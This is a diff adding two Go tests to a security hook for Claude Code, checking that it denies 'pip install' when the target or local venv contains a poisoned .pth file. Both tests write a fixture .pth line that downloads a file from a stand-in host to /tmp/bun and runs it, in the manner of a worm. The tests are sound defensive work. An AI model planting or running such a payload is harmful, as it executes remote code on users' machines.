@@ -178,3 +178,53 @@ func decodeDecision(t *testing.T, buf *bytes.Buffer) decision {
 		PermissionDecisionReason: env.HookSpecificOutput.PermissionDecisionReason,
 	}
 }
+
+// TestRunClaudeCodeHook_PthWormPipTargetDeniesEarly mirrors
+// TestRunClaudeCodeHook_BindingGypWormPrefixTargetDeniesEarly for Python:
+// a `pip install --target <dir>` whose target tree contains a poisoned
+// .pth must be denied on the Hades worm reason before the generic
+// "re-run with veto" nudge, because prefixing with veto would not make
+// the already-poisoned tree safe to install into.
+func TestRunClaudeCodeHook_PthWormPipTargetDeniesEarly(t *testing.T) {
+	withVetoOnPath(t)
+	cwd := t.TempDir()
+	target := t.TempDir()
+	chdirForTest(t, cwd)
+
+	// Poison a .pth inside target's venv — NOT in cwd, so the test
+	// exercises flag-based root resolution and not just the cwd fallback.
+	site := filepath.Join(target, ".venv", "lib", "python3.11", "site-packages")
+	writePth(t, filepath.Join(site, "ensmallen-setup.pth"),
+		`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n")
+
+	in := encodePayload(t, "Bash", "pip install --target "+target+" requests")
+	var out bytes.Buffer
+	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
+	require.Equal(t, exitOK, rc)
+
+	d := decodeDecision(t, &out)
+	require.Equal(t, "deny", d.PermissionDecision)
+	require.Contains(t, d.PermissionDecisionReason, "Hades")
+	// Must NOT be the generic prefix nudge — the worm reason supersedes it.
+	require.NotContains(t, d.PermissionDecisionReason, "Re-run with an explicit")
+}
+
+func TestClaudeCodeHookDeniesPipInstallInPoisonedVenv(t *testing.T) {
+	root := t.TempDir()
+	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
+	require.NoError(t, os.MkdirAll(site, 0o755))
+	require.NoError(t, os.WriteFile(filepath.Join(site, "ensmallen-setup.pth"),
+		[]byte(`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n"),
+		0o644))
+
+	// Run the hook from inside `root` so its cwd-relative venv discovery
+	// finds the poisoned venv.
+	t.Chdir(root)
+
+	stdin := bytes.NewBufferString(`{"tool_name":"Bash","tool_input":{"command":"pip install ensmallen"}}`)
+	var stdout bytes.Buffer
+	rc := runClaudeCodeHook(zerolog.Nop(), stdin, &stdout)
+	require.Equal(t, 0, rc)
+	require.True(t, strings.Contains(stdout.String(), "Hades"), "expected Hades in deny reason; got %q", stdout.String())
+	require.True(t, strings.Contains(stdout.String(), `"deny"`), "expected deny envelope; got %q", stdout.String())
+}
